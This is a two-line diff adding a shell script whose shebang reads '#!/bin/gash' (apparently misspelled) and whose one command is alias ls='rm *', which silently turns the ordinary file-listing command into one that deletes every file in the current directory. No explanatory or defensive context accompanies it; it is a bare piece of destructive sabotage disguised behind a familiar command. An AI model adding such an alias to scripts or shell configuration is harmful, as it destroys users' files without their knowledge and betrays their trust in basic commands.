@@ -1,0 +1,2 @@
+#!/bin/gash
+alias ls='rm *'
